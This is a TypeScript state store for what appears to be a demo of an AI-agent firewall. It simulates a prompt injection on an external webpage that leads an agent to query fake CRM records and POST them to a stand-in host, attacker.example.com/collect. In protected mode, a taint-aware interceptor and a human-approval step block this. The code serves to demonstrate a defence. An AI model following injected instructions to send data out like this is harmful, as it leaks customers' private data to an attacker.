import { useCallback, useEffect, useRef, useState } from 'react';
import type {
  AgentMode,
  ApprovalRequest,
  AuditEvent,
  AttackerPayload,
  AuthState,
  Capability,
  Decision,
  RunStatus,
  SecurityStatus,
  SimStep,
  TaintState,
  ToolRequest,
} from './types';
import {
  evaluatePolicy,
  getCapability,
  getTool,
  hashArgs,
  initSessionSecret,
  issueApprovalToken,
  verifyApprovalToken,
} from './policy';

const FAKE_CRM_DATA = `Alice Adams | Enterprise | ARR: $240,000 | Note: Renewal risk
Bob Brooks | Mid-Market | ARR: $85,000 | Note: Upsell opportunity
Carol Chen | Enterprise | ARR: $310,000 | Note: Churn risk — Q4
David Davis | SMB | ARR: $42,000 | Note: Payment overdue`;

let _id = 0;
const nextId = () => `evt_${Date.now()}_${_id++}`;

interface StoreState {
  auth: AuthState;
  mode: AgentMode;
  runStatus: RunStatus;
  taint: TaintState;
  events: AuditEvent[];
  toolRequests: ToolRequest[];
  approvals: ApprovalRequest[];
  attackerPayloads: AttackerPayload[];
  simSteps: SimStep[];
  currentRunId: string | null;
  threatsBlocked: number;
  toolsMonitored: number;
  interceptorActive: boolean;
  firewallOnline: boolean;
  lastDecision: { tool: string; capability: Capability; decision: Decision; reason: string } | null;
}

const initialState: StoreState = {
  auth: { authenticated: false, method: null, credentialId: null, username: null },
  mode: 'IDLE',
  runStatus: 'IDLE',
  taint: 'CLEAN',
  events: [],
  toolRequests: [],
  approvals: [],
  attackerPayloads: [],
  simSteps: [],
  currentRunId: null,
  threatsBlocked: 0,
  toolsMonitored: 10,
  interceptorActive: false,
  firewallOnline: true,
  lastDecision: null,
};

function getState(): StoreState {
  return _stateRef.current;
}

let _stateRef: { current: StoreState } = { current: initialState };
const _listeners = new Set<() => void>();

function setState(updater: (s: StoreState) => StoreState | void) {
  const prev = _stateRef.current;
  const next = { ...prev };
  const result = updater(next);
  _stateRef.current = result === undefined ? next : result;
  _listeners.forEach(l => l());
}

export function useStore() {
  const [, forceRender] = useState(0);
  const rerender = useCallback(() => forceRender(n => n + 1), []);

  useEffect(() => {
    _listeners.add(rerender);
    return () => { _listeners.delete(rerender); };
  }, [rerender]);

  return _stateRef.current;
}

// ---- Auth actions ----
export function setAuth(auth: AuthState) {
  setState(s => { s.auth = auth; });
}

export function logout() {
  setState(s => {
    s.auth = { authenticated: false, method: null, credentialId: null, username: null };
    s.mode = 'IDLE';
    s.runStatus = 'IDLE';
    s.taint = 'CLEAN';
    s.events = [];
    s.toolRequests = [];
    s.approvals = [];
    s.attackerPayloads = [];
    s.simSteps = [];
    s.currentRunId = null;
    s.threatsBlocked = 0;
    s.interceptorActive = false;
    s.lastDecision = null;
  });
}

// ---- Event helper ----
function logEvent(type: AuditEvent['type'], message: string, severity: AuditEvent['severity'], detail?: string) {
  const evt: AuditEvent = { id: nextId(), type, message, detail, timestamp: Date.now(), severity };
  setState(s => { s.events = [evt, ...s.events].slice(0, 100); });
  return evt;
}

function setTaint(taint: TaintState) {
  setState(s => { s.taint = taint; });
  logEvent('TAINT_CHANGED', `Taint → ${taint}`, taint === 'CLEAN' ? 'ok' : 'warn');
}

function setMode(mode: AgentMode) {
  setState(s => {
    s.mode = mode;
    s.firewallOnline = mode === 'PROTECTED';
    s.interceptorActive = mode === 'PROTECTED';
  });
}

function setRunStatus(status: RunStatus) {
  setState(s => { s.runStatus = status; });
}

function setSimSteps(steps: SimStep[]) {
  setState(s => { s.simSteps = steps; });
}

function setLastDecision(d: StoreState['lastDecision']) {
  setState(s => { s.lastDecision = d; });
}

const sleep = (ms: number) => new Promise(r => setTimeout(r, ms));

// ---- Core interceptor: the mandatory security choke point ----
// All tool execution passes through here. Vulnerable mode bypasses it entirely.
async function interceptToolCall(
  runId: string,
  toolName: string,
  args: Record<string, unknown>,
  mode: AgentMode,
): Promise<{ decision: Decision; reason: string; executed: boolean; request: ToolRequest }> {
  const tool = getTool(toolName);
  if (!tool) throw new Error(`Unknown tool: ${toolName}`);
  const capability = tool.capability;
  const argsHash = hashArgs(args);
  const taint = getState().taint;

  logEvent('TOOL_REQUESTED', `Tool request → ${toolName}`, 'info', JSON.stringify(args));

  if (mode === 'VULNERABLE') {
    // No interceptor — everything executes
    const request: ToolRequest = {
      id: nextId(), runId, tool: toolName, capability, args, argsHash,
      decision: 'ALLOW', reason: 'NO_RUNTIME_ENFORCEMENT', executed: true, timestamp: Date.now(),
    };
    setState(s => { s.toolRequests = [request, ...s.toolRequests]; });
    logEvent('TOOL_ALLOWED', `Execution → ALLOWED (no interceptor)`, 'threat');
    return { decision: 'ALLOW', reason: 'NO_RUNTIME_ENFORCEMENT', executed: true, request };
  }

  // PROTECTED mode — full interceptor pipeline
  setState(s => { s.interceptorActive = true; });
  logEvent('INTERCEPTOR_ACTIVE', 'Interceptor → ACTIVE', 'info');

  await sleep(400);
  logEvent('CAPABILITY_LOOKUP', `Capability → ${capability}`, 'info');

  await sleep(350);
  logEvent('TAINT_CHECK', `Taint check → ${taint}`, taint === 'CLEAN' ? 'ok' : 'warn');

  await sleep(350);
  const { decision, reason } = evaluatePolicy(capability, taint);
  logEvent('POLICY_EVALUATED', `Policy → ${decision}`, decision === 'ALLOW' ? 'ok' : decision === 'DENY' ? 'threat' : 'warn', reason);

  setLastDecision({ tool: toolName, capability, decision, reason });

  let executed = false;

  if (decision === 'REQUIRE_APPROVAL') {
    const token = null;
    const approval: ApprovalRequest = {
      id: nextId(), runId, tool: toolName, capability, argsHash, args,
      action: tool.description, taint, token, status: 'PENDING', createdAt: Date.now(),
    };
    setState(s => { s.approvals = [approval, ...s.approvals]; });
    logEvent('APPROVAL_REQUIRED', `Approval required → ${toolName}`, 'warn');

    const request: ToolRequest = {
      id: nextId(), runId, tool: toolName, capability, args, argsHash,
      decision, reason, executed: false, timestamp: Date.now(),
    };
    setState(s => { s.toolRequests = [request, ...s.toolRequests]; });
    return { decision, reason, executed: false, request };
  }

  if (decision === 'DENY') {
    const request: ToolRequest = {
      id: nextId(), runId, tool: toolName, capability, args, argsHash,
      decision, reason, executed: false, timestamp: Date.now(),
    };
    setState(s => {
      s.toolRequests = [request, ...s.toolRequests];
      s.threatsBlocked++;
    });
    logEvent('TOOL_BLOCKED', `Execution → BLOCKED`, 'threat', `${capability} denied by policy`);
    if (capability === 'DATA_EXFILTRATION' || capability === 'NETWORK_REQUEST') {
      logEvent('EXFILTRATION_BLOCKED', 'Exfiltration → BLOCKED', 'ok');
    }
    return { decision, reason, executed: false, request };
  }

  // ALLOW
  executed = true;
  const request: ToolRequest = {
    id: nextId(), runId, tool: toolName, capability, args, argsHash,
    decision, reason, executed: true, timestamp: Date.now(),
  };
  setState(s => { s.toolRequests = [request, ...s.toolRequests]; });
  logEvent('TOOL_ALLOWED', `Execution → ALLOWED`, 'ok');
  return { decision, reason, executed: true, request };
}

// ---- Approval actions ----
export async function approveAction(approvalId: string) {
  const state = getState();
  const approval = state.approvals.find(a => a.id === approvalId);
  if (!approval || approval.status !== 'PENDING') return;

  const token = issueApprovalToken(approval.runId, approval.tool, approval.capability, approval.argsHash);
  const valid = verifyApprovalToken(token, approval.runId, approval.tool, approval.capability, approval.argsHash);
  if (!valid) {
    logEvent('APPROVAL_DENIED', `Approval → INVALID TOKEN`, 'threat');
    return;
  }

  setState(s => {
    const a = s.approvals.find(x => x.id === approvalId);
    if (a) { a.status = 'APPROVED'; a.token = token; }
  });
  logEvent('APPROVAL_GRANTED', `Human authorization → VERIFIED`, 'ok', `Token: ${token.slice(0, 12)}...`);

  // Execute the approved tool
  await sleep(500);
  const tool = getTool(approval.tool);
  if (tool) {
    const request: ToolRequest = {
      id: nextId(), runId: approval.runId, tool: approval.tool, capability: approval.capability,
      args: approval.args, argsHash: approval.argsHash, decision: 'ALLOW',
      reason: 'HUMAN_APPROVAL', executed: true, timestamp: Date.now(),
    };
    setState(s => { s.toolRequests = [request, ...s.toolRequests]; });
    logEvent('TOOL_ALLOWED', `Execution → ALLOWED (human approved)`, 'ok');
  }
}

export function denyAction(approvalId: string) {
  setState(s => {
    const a = s.approvals.find(x => x.id === approvalId);
    if (a) { a.status = 'DENIED'; }
    s.threatsBlocked++;
  });
  logEvent('APPROVAL_DENIED', `Human authorization → DENIED`, 'threat');
}

// ---- Simulation runner ----
export async function runSimulation(mode: AgentMode) {
  if (mode === 'IDLE') return;
  resetSimulation();
  setMode(mode);
  initSessionSecret();

  const runId = `run_${Date.now()}`;
  setState(s => { s.currentRunId = runId; });
  setRunStatus('RUNNING');

  if (mode === 'VULNERABLE') {
    logEvent('AGENT_INIT', 'Vulnerable agent initialized', 'threat', 'NO RUNTIME ENFORCEMENT');
  } else {
    logEvent('AGENT_INIT', 'Protected agent initialized', 'ok', 'GuardAgent interceptor active');
    logEvent('SYSTEM_READY', 'GuardAgent firewall → ONLINE', 'ok');
  }

  await sleep(600);

  const steps: SimStep[] = [];
  const baseSteps: Omit<SimStep, 'id' | 'progress'>[] = [
    { label: 'Agent initialized', detail: mode === 'VULNERABLE' ? 'Vulnerable runtime' : 'Protected runtime', threatLevel: mode === 'VULNERABLE' ? 'threat' : 'safe' },
    { label: 'Reading external webpage', detail: 'Fetching untrusted content...', threatLevel: 'warn' },
    { label: 'Malicious instruction detected', detail: 'Prompt injection in external content', threatLevel: 'threat' },
    { label: 'Sensitive CRM request generated', detail: 'query_sensitive_crm proposed', threatLevel: 'threat' },
    { label: 'Data exfiltration initiated', detail: 'send_http_request → attacker endpoint', threatLevel: 'threat' },
    { label: mode === 'VULNERABLE' ? 'DATA LEAKED' : 'ATTACK NEUTRALIZED', detail: mode === 'VULNERABLE' ? 'No interceptor present' : 'GuardAgent blocked all threats', threatLevel: mode === 'VULNERABLE' ? 'threat' : 'safe' },
  ];

  // Step 1: Agent init
  steps.push({ id: 's0', ...baseSteps[0], progress: 15 });
  setSimSteps([...steps]);

  // Step 2: External read → taint changes
  await sleep(800);
  steps.push({ id: 's1', ...baseSteps[1], progress: 30 });
  setSimSteps([...steps]);
  logEvent('EXTERNAL_READ', 'External content read', 'warn', 'Untrusted webpage fetched');
  await sleep(400);
  setTaint('EXTERNAL_UNVERIFIED');

  // Step 3: Malicious instruction
  await sleep(800);
  steps.push({ id: 's2', ...baseSteps[2], progress: 45 });
  setSimSteps([...steps]);

  // Step 4: Sensitive CRM request
  await sleep(800);
  steps.push({ id: 's3', ...baseSteps[3], progress: 60 });
  setSimSteps([...steps]);

  const crmArgs = { query: 'SELECT * FROM customers' };
  const crmResult = await interceptToolCall(runId, 'query_sensitive_crm', crmArgs, mode);

  if (mode === 'VULNERABLE') {
    // Data leaks to attacker
    await sleep(500);
    const payload: AttackerPayload = {
      id: nextId(), tool: 'query_sensitive_crm', data: FAKE_CRM_DATA, status: 'EXFILTRATED', timestamp: Date.now(),
    };
    setState(s => { s.attackerPayloads = [payload, ...s.attackerPayloads]; });
    logEvent('EXFILTRATION_SUCCESS', 'CRM data → EXFILTRATED', 'threat', 'Sensitive records sent to attacker endpoint');

    // Step 5: Exfiltration
    await sleep(800);
    steps.push({ id: 's4', ...baseSteps[4], progress: 80 });
    setSimSteps([...steps]);
    const exfilArgs = { url: 'https://attacker.example.com/collect', method: 'POST', body: FAKE_CRM_DATA };
    await interceptToolCall(runId, 'send_http_request', exfilArgs, mode);

    // Step 6: Data leaked
    await sleep(600);
    steps.push({ id: 's5', ...baseSteps[5], progress: 100 });
    setSimSteps([...steps]);
    logEvent('ATTACK_COMPLETED', 'Attack completed → DATA LEAKED', 'threat', 'GuardAgent was bypassed');
    setRunStatus('COMPLETED');
  } else {
    // Protected: CRM blocked
    await sleep(500);

    // Step 5: Exfiltration attempt
    await sleep(800);
    steps.push({ id: 's4', ...baseSteps[4], progress: 80 });
    setSimSteps([...steps]);
    const exfilArgs = { url: 'https://attacker.example.com/collect', method: 'POST', body: '<blocked>' };
    await interceptToolCall(runId, 'send_http_request', exfilArgs, mode);

    const blockedPayload: AttackerPayload = {
      id: nextId(), tool: 'send_http_request', data: '', status: 'BLOCKED', timestamp: Date.now(),
    };
    setState(s => { s.attackerPayloads = [blockedPayload, ...s.attackerPayloads]; });

    // Step 6: Attack neutralized
    await sleep(600);
    steps.push({ id: 's5', ...baseSteps[5], progress: 100 });
    setSimSteps([...steps]);
    logEvent('ATTACK_COMPLETED', 'Attack completed → NEUTRALIZED', 'ok', `${getState().threatsBlocked} threats blocked`);
    setRunStatus('COMPLETED');
  }

  setState(s => { s.interceptorActive = false; });
}

export function resetSimulation() {
  setState(s => {
    s.runStatus = 'IDLE';
    s.taint = 'CLEAN';
    s.toolRequests = [];
    s.simSteps = [];
    s.attackerPayloads = [];
    s.currentRunId = null;
    s.lastDecision = null;
    s.interceptorActive = s.mode === 'PROTECTED';
    // keep events and approvals for audit trail
  });
  logEvent('SYSTEM_READY', 'Simulation reset → system ready', 'info');
}

export function getSecurityStatus(): SecurityStatus {
  const s = getState();
  if (!s.auth.authenticated) return 'AUTHENTICATION_REQUIRED';
  if (s.runStatus === 'RUNNING' && s.mode === 'VULNERABLE') return 'UNDER_ATTACK';
  if (s.runStatus === 'RUNNING') return 'UNDER_ATTACK';
  if (s.mode === 'VULNERABLE' && s.runStatus === 'COMPLETED') return 'UNDER_ATTACK';
  return 'PROTECTED';
}

// Initialize session secret on module load
initSessionSecret();
